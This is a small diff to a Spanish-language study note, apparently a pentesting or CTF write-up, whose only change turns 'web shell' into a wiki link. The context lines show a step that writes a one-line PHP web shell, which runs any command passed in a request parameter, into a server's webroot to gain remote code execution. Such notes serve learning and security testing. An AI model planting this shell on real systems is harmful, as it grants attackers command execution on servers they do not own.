@@ -62,7 +62,7 @@ Si la página no da error, la escritura funcionó. Accediendo a `proof.txt` se v
 
 # Escribir una web shell → RCE
 
-Confirmada la escritura, se deja una web shell PHP mínima en el webroot:
+Confirmada la escritura, se deja una [[09 - Introducción a web shells|web shell]] PHP mínima en el webroot:
 
 ```php
 <?php system($_REQUEST[0]); ?>
